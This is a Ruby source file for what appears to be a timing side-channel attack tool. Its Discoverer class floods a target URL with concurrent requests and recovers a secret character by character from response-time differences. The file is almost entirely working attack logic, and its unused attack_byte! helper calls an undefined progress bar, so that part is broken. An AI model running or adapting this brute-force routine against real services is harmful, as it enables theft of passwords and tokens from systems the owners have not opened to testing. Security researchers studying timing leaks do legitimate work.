module TimingAttack
  class Discoverer
    def initialize(url: , delta: 0.005, concurrency: 3, iterations: 10)
      @options = {
        url: url,
        method: :get,
        params: {
          delta: delta
        }
      }
      @iterations = iterations
      @concurrency = concurrency
      @delta = delta
    end

    def run!
      attack!
    end

    private
    attr_reader :iterations, :concurrency, :attacks, :options, :delta

    BYTES = (' '..'z').to_a
    def attack!
      known = ""
      while(true)
        puts "\e[H\e[2J"
        puts "#{spinner} '#{known}'"
        attacks = BYTES.map { |byte| TestCase.new(input: "#{known}#{byte}", options: @options) }
        hydra = Typhoeus::Hydra.new(max_concurrency: concurrency)
        iterations.times do
          attacks.each do |attack|
            req = attack.generate_hydra_request!
            hydra.queue req
          end
        end
        hydra.run
        attacks.each(&:process!)
        grouper = Grouper.new(attacks: attacks, group_by: { percentile: 3 })
        results = grouper.long_tests.map(&:input)
        if grouper.long_tests.count > 1
          raise StandardError.new("Got too many possibilities: #{results.join(', ')}")
        end
        known = results.first
      end
    end

    SPINNER = %w(| / - \\)
    def spinner
      @spinner_i ||= 0
      @spinner_i += 1
      SPINNER[@spinner_i % SPINNER.length]
    end
    def attack_byte!
      hydra = Typhoeus::Hydra.new(max_concurrency: concurrency)
      iterations.times do
        attacks.each do |attack|
          req = attack.generate_hydra_request!
          req.on_complete do |response|
            attack_bar.increment
          end
          hydra.queue req
        end
      end
      hydra.run
      attacks.each(&:process!)
    end

  end
end
